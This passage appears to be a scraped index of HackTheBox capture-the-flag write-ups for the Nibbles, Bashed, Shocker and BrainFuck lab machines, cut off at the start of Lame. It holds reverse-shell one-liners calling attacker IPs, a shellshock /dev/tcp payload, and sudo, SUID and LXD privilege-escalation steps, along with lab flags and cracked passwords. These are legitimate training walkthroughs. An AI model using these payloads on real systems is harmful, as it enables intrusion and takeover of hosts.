Arbitrary File Upload (Metasploit) php/remote/38489.rb Launch msfconsole Set OPTIONS Set PASSWORD msf6 exploit(multi/http/nibbleblog_file_upload) &amp;gt; set PASSWORD nibbles Set USERNAME msf6 exploit(multi/http/nibbleblog_file_upload) &amp;gt; set USERNAME admin Set RHOSTS msf6 exploit(multi/http/nibbleblog_file_upload) &amp;gt; set RHOSTS 10.10.10.75 Set TARGETURI msf6 exploit(multi/http/nibbleblog_file_upload) &amp;gt; set TARGETURI /nibbleblog Set LHOST msf6 exploit(multi/http/nibbleblog_file_upload) &amp;gt; set LHOST tun0 Exploit! Nibbleblog 4.0.3 Arbitrary File Upload w/o Metasploit Found python exploit ┌──(root💀kali)-[~/htb/nibbles/10.10.10.75/exploit] └─# curl -s https://raw.githubusercontent.com/TheRealHetfield/exploits/master/nibbleBlog_fileUpload.py &amp;gt; exploit.py Create PHP Payload w/ msfvenom ┌──(root💀kali)-[~/htb/nibbles/10.10.10.75/exploit] └─# msfvenom -p php/reverse_perl --format raw -o nibble.txt LHOST=10.10.14.2 LPORT=4444 Change options in exploit.py nibbleUsername = &quot;admin&quot; nibblePassword = &quot;nibbles&quot; nibbleURL = &quot;http://nibbles.htb/nibbleblog/&quot; Start listener Exploit! ┌──(root💀kali)-[~/htb/nibbles/10.10.10.75/exploit] └─# python exploit.py [-] LOGIN RESPONSE: 200 OK [+] Login Successful. [-] Upload likely successful. [-] UPLOAD RESPONSE: 200 OK [+] Exploit launched, check for shell. [-] EXPLOIT RESPONSE: 200 OK Upgrade shell to navigate the system /usr/bin/python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; User Flag d4d25b1208ca67d967af58cdf274172e Privilege EscalationRoot - Via Sudo Check nibbler sudo access nibbler@Nibbles:/home/nibbler$ sudo -l Matching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh Able to run /home/nibbler/personal/stuff/monitor.sh as root Exploit nibbler@Nibbles:/home/nibbler$ mkdir -p /home/nibbler/personal/stuff nibbler@Nibbles:/home/nibbler$ echo &quot;/bin/bash -p&quot; &amp;gt; /home/nibbler/personal/stuff/monitor.sh; chmod 4777 /home/nibbler/personal/stuff/monitor.sh nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh Exploit Explanation monitor resides in nibbler’s home directory, giving nibbler RWX on all files that resides there. Since we are able to execute montior.sh as root, we are able to create a script (monitor.sh) in nibbles’s home directory that will execute /bin/bash as sudo, giving us root Root Flag 9c53a06fb42fcebeb3627522b8a3f0ac " }, { "title": "HackTheBox - Bashed", "url": "/posts/Bashed/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/cronjob", "date": "2022-08-21 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web directory enumeration, finding a directory /dev directory containing a file phpbash.php that has code execution functionality, allowing us to obtain a low-privilege/www-data shell.User www-data has a sudoers entry that allows www-data to run any command as scriptmanager, allowing us to privilege escalate to scriptmanagerFurther enumeration of the system is done w/ linpeas.sh, discovering a directory /scripts that contains a python script that we have RWX access to. Also, within last 5 minutes a file /scripts/test.txt has been modified, suggesting that there is could be a cronjob running, pspy is used to confirm that a cronjob is running that executes all python script in /scripts directory every minute as root, and by creating a reverse shell python script in /scripts directory, it allowed us to privilege escalate to root. Column Details Box Name Bashed IP 10.10.10.68 Points - Difficulty Easy Creator Arrexel Release Date 09-Sep-2022 ReconTCP/80 (HTTP)FFUFdev [Status: 301, Size: 306, Words: 20, Lines: 10]fonts [Status: 301, Size: 308, Words: 20, Lines: 10]images [Status: 301, Size: 309, Words: 20, Lines: 10]index.html [Status: 200, Size: 7743, Words: 2956, Lines: 162]js [Status: 301, Size: 305, Words: 20, Lines: 10]php [Status: 301, Size: 306, Words: 20, Lines: 10]server-status [Status: 403, Size: 298, Words: 22, Lines: 12]uploads [Status: 301, Size: 310, Words: 20, Lines: 10]:: Progress: [4615/4615] :: Job [1/1] :: 1102 req/sec :: Duration: [0:00:06] :: Errors: 0 :: /devInitial FootholdTCP/80 (HTTP) - Remote Code Execution Proceed to /dev, phpbash.php found phpbash.php allows us to execute commands Invoke a reverse shell python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.13&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39; www-data/low-privilege shell obtained User Flag 61ecdd09b54362a6470b4fc3ccee53ce Privilege EscalationScript Manager - Via Sudo Check sudo access for www-data www-data@bashed:/var/www/html$ sudo -l Matching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL Able to run any command as scriptmanager Obtain scriptmanager shell sudo -u scriptmanager /bin/bash Root - Via Cronjob Ran linpeas, found something interesting /scripts - we have write access /scripts/test.txt - modified within last 5minutes Cronjob? /scripts/test.py - python script that is writable Sniff processes w/ pspy UID 0 - root /bin/sh -c cd /scripts; for f in *.py; do python &quot;$f&quot;; done - is executed every minute as root all python scripts in /scripts are executed every minute Create python reverse shell script scriptmanager@bashed:/scripts$ nano /scripts/exploit.py import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.13&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]); Start listener and wait for cronjob to execute to obtain root shell Root Flag ea8a2ef2a3c75833cd8345e0c866a980 View cronjob executed by root # crontab -l * * * * * cd /scripts; for f in *.py; do python &quot;$f&quot;; done " }, { "title": "HackTheBox - Shocker", "url": "/posts/Shocker/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/shell-shock, linux-priv-esc/sudo/gtfo-bin", "date": "2022-08-20 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web directory enumeration, finding a cgi-bin/ directory, and by further enumerating the found directory (cgi-bin/), a bash script is found, allowing us to use an exploit called shellshock to execute commands, obtaining a low-privilege shell/shelly shell.On the system, the shelly has a sudoers entry that allows shelly to execute perl as root, which is exploitable allowing us to spawn a root shell. Column Details Box Name Shocker IP 10.10.10.56 Points - Difficulty Easy Creator mrb3n Release Date 30-Sep-2017 ReconTCP/80 (HTTP)FFUF [Status: 200, Size: 137, Words: 9, Lines: 10].hta [Status: 403, Size: 290, Words: 22, Lines: 12].htaccess [Status: 403, Size: 295, Words: 22, Lines: 12].htpasswd [Status: 403, Size: 295, Words: 22, Lines: 12]cgi-bin/ [Status: 403, Size: 294, Words: 22, Lines: 12]index.html [Status: 200, Size: 137, Words: 9, Lines: 10]server-status [Status: 403, Size: 299, Words: 22, Lines: 12] cgi-bin directory is foundInitial FootholdTCP/80 (HTTP) - Shell Shock Since the machine is called Shocker and we find a cgi-bin directory, it is very likely our initial foothold is obtained via shellshock Enumerate cgi-bin directory, specifying scripting language extensions ┌──(root💀kali)-[~/htb/shocker/10.10.10.56/loot] └─# ffuf -u http://shocker.htb/cgi-bin/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.cgi,.pl,.sh,.ps1,.py,.php&#39; user.sh [Status: 200, Size: 118, Words: 19, Lines: 8] user.sh Attempt shellshock on /cgi-bin/user.sh ┌──(root💀kali)-[~/htb/shocker/10.10.10.56/loot] └─# curl -A &quot;() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;&quot; http://shocker.htb/cgi-bin/user.sh shelly Obtain a shell ┌──(root💀kali)-[~/htb/shocker/10.10.10.56/loot] └─# curl -H &#39;User-Agent: () { :; }; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.8/4444 0&amp;gt;&amp;amp;1&#39; http://shocker.htb/cgi-bin/user.sh User Flag 2ec24e11320026d1e70ff3e16695b233 Privilege EscalationRoot - Via SUDO GTFOBins Check shelly sudo access /usr/bin/perl Perl has a GTFOBins entry Exploit and Obtain Root Flag sudo perl -e &#39;exec &quot;/bin/sh&quot;;&#39; 52c2715605d70c7619030560dc1ca467 Change password of root &amp;amp; SSH to obtain root user # passwd Enter new UNIX password: Retype new UNIX password: " }, { "title": "HackTheBox - BrainFuck", "url": "/posts/BrainFuck/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/lxd, cryptography", "date": "2022-08-19 00:00:00 +0800", "snippet": "OverviewThis is the second machine from OSCP’s TJNull’s OSCP List for HackTheBox.This machine begins w/ us enumerating several subdomains via NMAP’s HTTPS script, followed by a wordpress plugin exploit that allowed us to login to an admin account w/o any credentials.Next, we discovered another wordpress plugin, that stores SMTP credentials of user orestis, and via inspect element, we can unobscure the password.With the SMTP credentials, we access the SMTP Server as orestis and found email that revealed credentials for the forum.On the forum (sup3rs3cr3t.brainfuck.htb - subdomains we enumerated earlier), there is a thread that is discussing about id_rsa but it is encrypted, however, due to a habit by orestis, adding Orestis - Hacking for fun and profit at the end of every post, we are able to do a known-plaintext attack and uncover the key, allowing us to download orestis’s SSH private key, inturn allowing us to obtain orestis shell/user.To root, there are 2 ways, on orestis home directory there is a RSA encryption python tool that encrypts root.txt and stores sensitive information (variables that creates the ciphertext) into debug.txt, allowing us to reverse engineer and obtain the plaintext of root.txt.Another way (unintended way) is via LXD groups where orestis belongs to. It allows orestis to create a container that mounts the entire filesystem onto the container, allowing us root access to the system. Column Details Box Name BrainFuck IP 10.10.10.17 Points - Difficulty Insane Creator ch4p Release Date 29-Apr-2017 ReconTCP/443 (HTTPS)FFUF┌──(root💀kali)-[~/htb/brainfuck]└─# ffuf -u https://brainfuck.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : https://brainfuck.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________index.php [Status: 301, Size: 0, Words: 1, Lines: 1]wp-admin [Status: 301, Size: 194, Words: 7, Lines: 8]wp-content [Status: 301, Size: 194, Words: 7, Lines: 8]wp-includes [Status: 301, Size: 194, Words: 7, Lines: 8]xmlrpc.php [Status: 405, Size: 42, Words: 6, Lines: 1]:: Progress: [4615/4615] :: Job [1/1] :: 1106 req/sec :: Duration: [0:00:04] :: Errors: 0 :: wordpress CMS is runningNMAPNmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 -sV -p 443 &quot;--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)&quot; -oN /root/htb/brainfuck/10.10.10.17/scans/tcp443/tcp_443_https_nmap.txt -oX /root/htb/brainfuck/10.10.10.17/scans/tcp443/xml/tcp_443_https_nmap.xml 10.10.10.17...| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/emailAddress=orestis@brainfuck.htb/organizationalUnitName=IT/localityName=Athens| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/emailAddress=orestis@brainfuck.htb/organizationalUnitName=IT/localityName=Athens| Public Key type: rsa| Public Key bits: 3072| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2017-04-13T11:19:29| Not valid after: 2027-04-11T11:19:29| MD5: cbf1 6899 96aa f7a0 0565 0fc0 9491 7f20| SHA-1: f448 e798 a817 5580 879c 8fb8 ef0e 2d3d c656 cb66| -----BEGIN CERTIFICATE-----| MIIFQzCCA6ugAwIBAgIJAI24F5h8eY+HMA0GCSqGSIb3DQEBCwUAMIGTMQswCQYD| VQQGEwJHUjEPMA0GA1UECAwGQXR0aWNhMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV| BAoMDkJyYWluZnVjayBMdGQuMQswCQYDVQQLDAJJVDEWMBQGA1UEAwwNYnJhaW5m| dWNrLmh0YjEkMCIGCSqGSIb3DQEJARYVb3Jlc3Rpc0BicmFpbmZ1Y2suaHRiMB4X| DTE3MDQxMzExMTkyOVoXDTI3MDQxMTExMTkyOVowgZMxCzAJBgNVBAYTAkdSMQ8w| DQYDVQQIDAZBdHRpY2ExDzANBgNVBAcMBkF0aGVuczEXMBUGA1UECgwOQnJhaW5m| dWNrIEx0ZC4xCzAJBgNVBAsMAklUMRYwFAYDVQQDDA1icmFpbmZ1Y2suaHRiMSQw| IgYJKoZIhvcNAQkBFhVvcmVzdGlzQGJyYWluZnVjay5odGIwggGiMA0GCSqGSIb3| DQEBAQUAA4IBjwAwggGKAoIBgQCjBI0m6FWgcLYONyxVeMgc+PuTFJMnMUjMb8BF| t0PIDSCt10grCCfzBNDIqfU9byiokyYVvvD+sRoWJQfMjd3I3NXMxHwpcLM6X9oR| Twt1iBBJRQkTnHOs1hyCmkiM+kn2W1xdL+mwBylAUlvUReLIDdS5anE7u95ApWsD| TTUt/mMUl1DwnCqrNkt3czQzCNfCIwIhbaLjsoXsiVo1fFEr6UpsyiaXad9eTTsl| EF9k3rByXrmP1WrkaFLqGhqS4v+rYtsyKGPngjAB664aAvB2sSI0/EuOTa7WOPcV| NP3Tga+zx55qXPeo6nqCttOlAKKwiZqba5AgDAjSFdB6Q60dghWSuRYU999Ku6zA| DdwP0BoT5+kcZJENY7wx1uzysSMrtCoi8E6bfx42UwNQe/UCDDXErXat90hTB+vV| h2vaSdyR0tz3w1iIHBZH5/3rY3f+LyfE9fSg2TbGFgZNDq6O/iykVWb9SG+tl1fA| RB208Y1/mOw0+84G9RIjLVMLb0kCAwEAAaOBlzCBlDAdBgNVHQ4EFgQUj12KscJg| /6gSHzm+kzSN/psvik8wHwYDVR0jBBgwFoAUj12KscJg/6gSHzm+kzSN/psvik8w| DAYDVR0TBAUwAwEB/zALBgNVHQ8EBAMCBeAwNwYDVR0RBDAwLoIRd3d3LmJyYWlu| ZnVjay5odGKCGXN1cDNyczNjcjN0LmJyYWluZnVjay5odGIwDQYJKoZIhvcNAQEL| BQADggGBAJ11TuRhhSQfq5NHXU5fV5VkCOPUx3yKsWjt93Qm8WDD2rJcZAq8jW59| NHDWhzDlKZMyNYv8gKJ8k6HuG3f20yeifKZulGw/YsY6dDtTzO+tooBqzjWb9irh| bpMIVXv1xBSuz+f5YGdzpvlMK/Ltt1nEQNjKXaTnjy7OGfp4isMZCzBZeKAKnjdn| +s6TgFrFA94B56naXNaNLHvv9WcFKviwDTP2PtDz0fc9hbnZz8oxE5Q6/l50NGUK| 6bGCVIjDJfM/SsWPLHb4J6chkJxlZZLmpid+s5PsKSdY0ZZ1Oxb20O2mla77hDSJ| d43t/sZRBwWPEWxAHUR8Dj5pcrbCFyi57Qu4ENc5w7H0RhRyd0/OWs6ahn2ef4Qy| DSWfdpd5CVBGdSLVlVSjzLcBDmWuyy8q5CTgJ3VzIzOreg93F2mVAF+tlNZRX9rc| dFjsS0lwXWRZqd6642VuAtf4HoAFBh9PfBtUx+t1DxCXyY7OTwnvMsnNFg9fw11v| krhc81zFeg==|_-----END CERTIFICATE----- Subdomains sup3rs3cr3t.brainfuck.htb brainfuck.htb Initial FootholdTCP/443 (HTTPS) - WP Responsive Ticket System Plugin Exploit Add both subdomains to /etc/hosts Proceed to https://brainfuck.htb, view post (Dev Update) oretis admin Enumerate wordpress Users ┌──(root💀kali)-[~/htb/brainfuck] └─# wpscan --no-update --disable-tls-checks --url https://brainfuck.htb -e u -f cli-no-color 2&amp;gt;&amp;amp;1 |tee &quot;/root/htb/brainfuck/10.10.10.17/scans/tcp443/tcp_443_https_wpscan_user_enum.txt&quot; ... [i] User(s) Identified: [+] admin | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] administrator | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) admin administrator Plugins ┌──(root💀kali)-[~/htb/brainfuck] └─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url https://brainfuck.htb -e ap -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/htb/brainfuck/10.10.10.17/scans/tcp443/tcp_443_https_wpscan_plugins_enum.txt&quot; [i] Plugin(s) Identified: [+] akismet | Location: https://brainfuck.htb/wp-content/plugins/akismet/ | Last Updated: 2021-10-01T18:28:00.000Z | Readme: https://brainfuck.htb/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 4.2.1 | | Found By: Known Locations (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/akismet/, status: 200 | | Version: 3.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/akismet/readme.txt [+] easy-wp-smtp | Location: https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/ | Last Updated: 2021-07-13T07:46:00.000Z | Readme: https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/readme.txt | [!] The version is out of date, the latest version is 1.4.7 | [!] Directory listing is enabled | | Found By: Known Locations (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/, status: 200 | | Version: 1.2.5 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/readme.txt [+] wp-support-plus-responsive-ticket-system | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/ | Last Updated: 2019-09-03T07:57:00.000Z | Readme: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt | [!] The version is out of date, the latest version is 9.1.2 | [!] Directory listing is enabled | | Found By: Known Locations (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/, status: 200 | | Version: 7.1.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt wp-support-plus-responsive-ticket-system 7.1.3 easy-wp-smtp Find exploits for wp support plus responsive ticket system 7.1.3 Exploit Title Path WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 Privilege Escala php/webapps/41006.txt WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 SQL Injection php/webapps/40939.txt Try php/webapps/41006.txt - Privilege Escalation This exploit allows you to login as any user due to of an incorrect usage of wp_set_auth_cookie(). Create form exploit.html Host form w/ python webserver ┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/exploit] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Proceed to http://localhost/exploit.html and click Login Allow it to process for a moment, and you are Admin! php/webapps/40939.txt - SQLi, did not work for me Proceed to Settings &amp;gt; Easy WP SMTP Inspect element and change type from password to text to reveal password kHGuERB29DNiNE Accessing SMTP Server Launch Thunderbird to view email View Forum Access Details email orestis:kIEnnfEKJ#9UmdO This is likely used for sup3rs3cr3t.brainfuck.htb subdomain TCP/443 (HTTPS) - Encrypted text Proceed to sup3rs3cr3t.brainfuck.htb &amp;amp; login w/ orestis:kIEnnfEKJ#9UmdO View SSH Access post Orestis - Hacking for fun and profit is always written at the end of orestis’s post Encrypted thread to converse about SSH key View Key post The encrypted text at the end of all of orestis’s post looks like the text we saw from earlier Orestis - Hacking for fun and profit Pieagnm - Jkoijeg nbw zwx mle grwsnn Wejmvse - Fbtkqal zqb rso rnl cwihsf Qbqquzs - Pnhekxs dpi fca fhf zdmgzt However, the ciphertext is different for every post The encrypted text from admin, can be guessed mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr mnvze is likely http sp_ptr is likely id_rsa We can figure out the encryption key via known-plaintext attackDerive encryption key w/ Vigenere Cipher (Subtraction) Example of encrypting a Plaintext w/ a Key Plaintext: THIS IS SECRET Key: XVHE UW NOPGDZ Ciphertext: QCPW CO FSRXHS Plaintext + Key = Ciphertext T(19) + X(23) = Q(16) Example of deriving the Key from Plaintext &amp;amp; Ciphertext Plaintext: THIS IS SECRET Key: XVHE UW NOPGDZ Ciphertext: QCPW CO FSRXHS Key = Ciphertext - Plaintext Key = Q(16) - T(19) Derive key Ciphertext: Pieagnm - Jkoijeg nbw zwx mle grwsn Plaintext: Orestis - Hacking for fun and profit Key = P - O(14) #B Key = i - r(17) #R Key = e - e(4) #A Key = a - s(18) #I Key = g - t(19) #N Key = n - i(8) #F Key = m - s(18) #U Key = J - H(7) #C Key = k - a(0) #K Key = o - c(2) #M Key = i - k(10) #Y Key = j - i(8) #B Key = FUCKMYBRAIN Decrypt URL https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa Derive encryption key w/ Vigenere Cipher (Vigenere Table) Vigenere Table Plaintext: Orestis - Hacking for fun and profit Ciphertext: Wejmvse - Fbtkqal zqb rso rnl cwihsf O Mapped to W = I r Mapped to e = N e mapped to j = F s mapped to m = U t mapped to v = C i mapped to s = K s mapped to e = M H mapped to F = Y a mapped to b = B c mapped to t = R k mapped to k = A i mapped to q = I n mapped to a = N Key = FUCKMYBRAIN TCP/22 (SSH) Download the key ┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot] └─# curl https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --insecure &amp;gt; id_rsa; chmod 600 id_rsa % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1766 100 1766 0 0 11118 0 --:--:-- --:--:-- --:--:-- 11106 SSH w/ downloaded key ┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot] └─# ssh orestis@$ip -i id_rsa Enter passphrase for key &#39;id_rsa&#39;: Crack SSH pass ┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot] └─# /root/tools/john/run/ssh2john.py id_rsa &amp;gt; id_rsa_john ┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot] └─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_john Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status 3poulakia! (id_rsa) 1g 0:00:00:04 DONE (2022-08-19 02:53) 0.2347g/s 2924Kp/s 2924Kc/s 2924KC/s 3poulakia!..3pornuthin Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed. 3poulakia! SSH &amp;amp; Obtain User FlagPrivilege EscalationRoot - Via Cracking/Reverse Engineering RSA View files in orestis home directory orestis@brainfuck:~$ ls -l total 28 -rw-rw-r-- 1 orestis orestis 619 Aug 18 22:48 debug.txt -rw-rw-r-- 1 orestis orestis 580 Apr 29 2017 encrypt.sage -rw-rw-r-- 1 orestis orestis 1041 Aug 18 22:32 encrypt.sage.py drwx------ 3 orestis orestis 4096 Apr 29 2017 mail -rw-rw-r-- 1 orestis orestis 329 Aug 18 22:48 output.txt -rw-rw-r-- 1 orestis orestis 5 Aug 18 22:27 password -r-------- 1 orestis orestis 33 Apr 29 2017 user.txt View encrypt.sage nbits = 1024 password = open(&quot;/root/root.txt&quot;).read().strip() enc_pass = open(&quot;output.txt&quot;,&quot;w&quot;) debug = open(&quot;debug.txt&quot;,&quot;w&quot;) m = Integer(int(password.encode(&#39;hex&#39;),16)) p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False) q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False) n = p*q phi = (p-1)*(q-1) e = ZZ.random_element(phi) while gcd(e, phi) != 1: e = ZZ.random_element(phi) c = pow(m, e, n) enc_pass.write(&#39;Encrypted Password: &#39;+str(c)+&#39;\\n&#39;) debug.write(str(p)+&#39;\\n&#39;) debug.write(str(q)+&#39;\\n&#39;) debug.write(str(e)+&#39;\\n&#39;) p, q, e - suggests that it is RSA We have the values of p, q, e in debug.txt ct/ciphertext/enc_pass - ciphertext/output of encoding root.txt` We have the values of it in output.txt RSA key generation works by computing: n = pq φ = (p-1)(q-1) d = (1/e) mod φ So given p, q, you can compute n and φ trivially via multiplication. From e and φ you can compute d, which is the secret key exponent. From there, your public key is [n, e] and your private key is [d, p, q]. Once you know those, you have the keys and can decrypt any messages. For RSA to be secure, p and q must be kept secret. With access to p, q, and e, calculating d (the decryption key) is trivial. Source Google for a script that will do the above for us def egcd(a, b): x,y, u,v = 0,1, 1,0 while a != 0: q, r = b//a, b%a m, n = x-u*q, y-v*q b,a, x,y, u,v = a,r, u,v, m,n gcd = b return gcd, x, y def main(): p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307 q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079 e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997 ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182 # compute n n = p * q # Compute phi(n) phi = (p - 1) * (q - 1) # Compute modular inverse of e gcd, a, b = egcd(e, phi) d = a print( &quot;n: &quot; + str(d) ); # Decrypt ciphertext pt = pow(ct, d, n) print( &quot;pt: &quot; + str(pt) ) if __name__ == &quot;__main__&quot;: main() Source Obtain values of p, q, e from debug.txt Obtain values of ct - ciphertext from output.txt Run decrypt script ┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot] └─# python decrypt.py n: 8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977 pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750 Then convert pt - plaintxt to Hex and then to ASCII m = Integer(int(password.encode(&#39;hex&#39;),16)) - due to this line of code (Line 6) Convert Root Flag 6efc1a5dbb8904751ce6566a305bb8ef Root - Via LXD View groups that orestis belongs to orestis@brainfuck:~$ groups orestis adm cdrom dip plugdev lxd lpadmin sambashare lxd LXD Group Exploit A member of the lxd group can easily privilege escalate to root because LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. We are able to use lxd to mount the entire victim’s filesystem into a container, allowing us to have root access to the entire system. Download and transfer image onto brainfuck.htb Exploit # import image(.tar file) into lxc lxc image import ./alpine.tar.gz --alias privesc # Initialize/start a container from that image lxc init privesc privesc-container -c security.privileged=true # Mount entire file system to the mnt of the container lxc config device add privesc-container mydevice disk source=/ path=/mnt/root recursive=true # Start the container lxc start privesc-container # Execute the container and get an interactive shell lxc exec privesc-container /bin/sh To obtain root, replace root hash w/ orestis’s vi /mnt/root/etc/shadow Switch to root w/ orestis’s password kHGuERB29DNiNE " }, { "title": "HackTheBox - Lame", "url": "/posts/Lame/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/kernel-exploit", "date": "2022-08-17 00:00:00 +0800", "snippet": "OverviewHackTheBox Lame marks the beginning of me trying to complete TJNull’s OSCP List for HackTheBox.This machine begins w/ nmap detecting a service exploit for distcc v1 that allows command execution, allowing us to obtain daemon user/shell.There are 2 privilege escalation techniques used in this machine, a SUID GTFOBin and a kernel exploit. Column Details Box Name Lame IP 10.10.10.3 Points - Difficulty Easy Creator ch4p Release Date 14-March-2018 ReconTCP/139,445 (SMB)Enum4linux Enumerated some users ┌──(root💀kali)-[~/htb/lame] └─# cat enum4linux_users | grep username username: root username: daemon username: bin username: sys username: sync username: games username: man username: lp username: mail username: news username: uucp username: proxy username: www-data username: backup username: list username: irc username: gnats username: libuuid username: dhcp username: syslog username: klog username: sshd username: bind username: postfix username: ftp username: postgres username: mysql username: tomcat55 username: distccd username: telnetd username: proftpd username: msfadmin username: user username: service username: nobody SMBMap Found a fileshare /tmp [+]IP:10.10.10.3:445 Name:10.10.10.3 